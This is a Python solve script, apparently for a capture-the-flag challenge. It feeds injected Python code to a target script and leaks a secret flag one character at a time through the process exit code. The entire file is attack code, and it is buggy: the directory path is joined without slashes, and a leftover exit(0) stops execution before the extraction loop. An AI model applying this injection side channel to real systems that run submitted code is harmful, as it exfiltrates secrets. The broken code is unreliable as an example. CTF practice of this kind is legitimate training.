def make_func(char_pos):
    return f"""def bye():
    flag_char = flag[{char_pos}]
    return ord(flag_char)"""

import subprocess

def getChar(char_pos):
    # Get target pwnable
    pwd = ''.join(f'{__file__}'.split('/')[:-1])
    cmds = ['python', f'{pwd}/../exitcode.py']

    # Construct python code for bit extraction
    func_str = make_func(char_pos)

    # Execute target pwnable
    res = subprocess.run(cmds, input=func_str.encode(), capture_output=False)

    return chr(res.returncode)


print(getChar(1))
exit(0)

# Since flag format is known, get characters until '}'
flag_chars = ['{', 'f', 'l', 'a', 'g', '_']
while flag_chars[-1] != '}':
    char = getChar(len(flag_chars))
    flag_chars.append(char)

flag = ''.join(flag_chars)
print(f'flag = {flag}')
